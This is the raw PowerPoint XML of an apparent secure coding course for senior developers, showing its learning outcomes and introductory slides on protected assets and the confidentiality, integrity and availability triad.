val="3819984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s://www.google.com/search?q=OWASP+Top+10&amp;sca_esv=91bd149827a5c7e1&amp;sxsrf=AE3TifPAQEZQ2KiEcT2IcipE8dz9Fs1lUg%3A1763047139608&amp;source=hp&amp;ei=4_YVaeTRI9KTkdUP5u-yyQs&amp;iflsig=AOw8s4IAAAAAaRYE8ybpwI3rz6WMCXBoxprHOVq_ny69&amp;ved=2ahUKEwiqubu2tu-QAxV6g_0HHeGxKaoQgK4QegQIARAB&amp;uact=5&amp;oq=What+is+the+OWASP+Top+10&amp;gs_lp=Egdnd3Mtd2l6IhhXaGF0IGlzIHRoZSBPV0FTUCBUb3AgMTAyBRAAGIAEMgUQABiABDIGEAAYFhgeMgYQABgWGB4yBhAAGBYYHjIGEAAYFhgeMgYQABgWGB4yBhAAGBYYHjIGEAAYFhgeMgYQABgWGB5ImyVQAFiOI3ABeACQAQCYAbkBoAGQF6oBBDYuMTm4AQPIAQD4AQGYAhqgAr4XwgIEECMYJ8ICChAjGIAEGCcYigXCAgsQABiABBiRAhiKBcICBRAuGIAEwgILEC4YgAQY0QMYxwHCAhAQIxjwBRiABBgnGMkCGIoFwgIKECMY8AUYJxieBsICChAjGPAFGCcYyQLCAgsQABiABBiSAxiKBcICBxAAGIAEGAqYAwCSBwQzLjIzoAexzwGyBwQyLjIzuAe8F8IHBjcuMTguMcgHIA&amp;sclient=gws-wiz&amp;mstk=AUtExfD5JQUeVP352xendKEVvaJoPTQqXbCk6cuO3IM6UULDvuYKkCcJ1NU1F6AwZcCi_E5NI8cOV9DO3Rmx3HmvNc6FPFhmgxCllEu76PXeb_QrCZ78nM5NGvxQqQ93YniGKrhLx4jfsXyV2760diLUD7XG8pidn-nR8ehhbDF7PW9hIpg&amp;csui=3"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hyperlink" Target="https://api.example.com/" TargetMode="External"/><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openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://evil.com/" TargetMode="Externa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s://cdn.example.com" TargetMode="External"/><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https://cdn.example.com" TargetMode="External"/><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hyperlink" Target="https://images.example.com" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide150.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://api.example.com" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://fonts.gstatic.com" TargetMode="Externa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Secure Coding</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For Senior Developers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="Calibri"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>By John Paul Franke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45029-A4A6-3E66-DD5C-536967CCD991}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Learning Outcomes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DDF6130E-F3DF-E24F-BD87-4DFC12122A5C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Design secure web/API architectures (microservices &amp; serverless)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Prevent injection/XSS via validation, encoding, and safe query construction</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Implement robust </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>authn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>authz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>/session patterns; avoid IDOR/logic flaws</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Integrate SCA/SAST/DAST into CI/CD with risk-based gating</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Apply supply-chain &amp; secrets-management practices</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Perform focused threat modeling and secure code reviews</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="141719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A6227-2553-CE63-CE2D-EA7D8F25219D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="2136906"/>
            <a:ext cx="10515600" cy="2591359"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Session 1:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Security Refresher, Secure Application Architecture, &amp; HTTP Foundations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2247694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990B2-5EB3-E981-A75A-55030E041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6ADE7-6D9F-892E-406F-B8EEA4046F86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="2014285"/>
            <a:ext cx="10515600" cy="2836600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Lesson 01 - Security Refresher</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Topic 01 – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
              </a:rPr>
              <a:t>Assets, Attackers, and Abuse-Case Thinking</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2663180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2365-C45A-4CD1-C3E4-7C6E334D9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EC212-82F4-BDE2-8196-46BA2AA3F6F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri Light"/>
                <a:ea typeface="Calibri Light"/>
                <a:cs typeface="Calibri Light"/>
              </a:rPr>
              <a:t>1.1.1 - What Are we Protecting?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5024A72-256A-479A-BBEB-2153EEAF2E16}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="5109411" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Cybersecurity is generally about protecting assets:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Calibri" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Calibri" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Calibri" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Intellectual Property</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:buFont typeface="Calibri" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Private Information</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>… etc.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2097510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290E9-0986-6925-BA39-2D5B1CE3E838}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Calibri Light"/>
                <a:ea typeface="Calibri Light"/>
                <a:cs typeface="Calibri Light"/>
              </a:rPr>
              <a:t>1.1.1 - What is security, really?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="A group of crystal shaped objects&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5AF3F1FC-DBCE-3110-4048-55649BD836D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6097327" y="1693334"/>
            <a:ext cx="5774267" cy="38523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Content Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC773325-B986-0EAB-4CDA-0188FEDCAA72}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="5109411" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CIA – the 3 central aspects of security:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>C – Confidentiality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>I – Integrity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A – Availability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If we lose one, even briefly, security is compromised.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="339652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33D61-7EAD-5FA5-EF35-B77E8BF63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96518-7A25-8ECA-C96A-BF61BAA1F80D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri Light"/>
                <a:ea typeface="Calibri Light"/>
                <a:cs typeface="Calibri Light"/>
              </a:rPr>
              <a:t>1.1.1 - Confidentiality</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="A group of crystal shaped objects&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{05654807-124B-5BD1-B402-E904C79F9CC2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6097327" y="1693334"/>
            <a:ext cx="5774267" cy="38523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Content Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FAE191B6-CAF2-DE4F-0A42-FF2720EF337F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="5109411" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Maintained</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> when only approved entities  can read the data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Enforced</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> with Encryption and Access Controls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Lost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> when data leaks to unauthorized parties</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2639198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2477F-D2AF-D24F-5397-671E6A026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CDE7A-5CDE-B453-0293-F5D735F0F8E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri Light"/>
                <a:ea typeface="Calibri Light"/>
                <a:cs typeface="Calibri Light"/>
              </a:rPr>
              <a:t>1.1.1 - Integrity</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="A group of crystal shaped objects&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67783AED-7B8A-5947-7723-50D9515DCB4E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6097327" y="1693334"/>
            <a:ext cx="5774267" cy="38523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Content Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B6E940A4-E605-3A21-6A6F-AFCD4C4E4FCB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="5109411" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Maintained</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> when Data and code can’t be altered improperly</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Enforced</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> with Hashing and digital signatures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Lost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> when tampering is undetected</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18867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3C905-F9BB-05E1-BC22-983DD4A6C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364D0-C9DF-D090-5FBD-DC55EA1CE3FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Calibri Light"/>
                <a:ea typeface="Calibri Light"/>
                <a:cs typeface="Calibri Light"/>
              </a:rPr>
              <a:t>1.1.1 - Availability</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="A group of crystal shaped objects&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B3B6D41-F69D-D1D6-7DCF-B58256ABF814}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6097327" y="1693334"/>
            <a:ext cx="5774267" cy="38523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Content Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FA1FCAC1-E8B2-803B-08DA-E73DF893DBF4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="5109411" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Maintained</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> when systems are usable when needed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Enforced</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> with Backups, redundancy, failovers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Lost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> when Systems or Data are made unavailable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
